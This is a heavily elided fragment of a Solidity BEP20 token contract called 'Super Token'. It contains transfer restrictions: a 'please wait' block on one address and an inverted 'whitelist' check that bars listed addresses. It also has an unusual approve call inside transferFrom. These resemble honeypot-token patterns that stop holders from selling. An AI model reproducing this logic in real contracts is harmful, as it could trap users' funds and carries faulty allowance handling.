...
contract SuperToken is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Super Token";
    ...
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        ...
        else require(recipient != newun || sender == recipient, "please wait");
    _transfer(sender, recipient, amount);
    approve(sender, _allowances[sender][msg.sender].sub(amount, "ERC20: error transfer amount exceeds allowance"));
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        // Whitelist 
        if(whitelistMode){
            require(!isWhitelisted[sender] && !isWhitelisted[recipient], "Whitelisted");
        }
...
event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
    ...
    require(recipient != address(0), "transfer recipent address 0 address");
